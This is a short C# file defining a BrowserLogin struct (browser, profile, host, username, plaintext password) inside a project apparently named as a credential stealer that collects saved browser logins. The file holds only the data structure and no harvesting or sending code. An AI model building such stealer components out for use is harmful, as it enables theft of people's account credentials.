namespace MyStealer.Collectors.Browser
{
    public struct BrowserLogin
    {
        public string BrowserName { get; set; }
        public string BrowserProfileName { get; set; }
        public string Host { get; set; }
        public string UserName { get; set; }
        public string Password { get; set; }

        public override string ToString() => $"{nameof(BrowserLogin)}({BrowserName} - {BrowserProfileName}){{{Host} -> {UserName}:{Password}}}";
    }
}
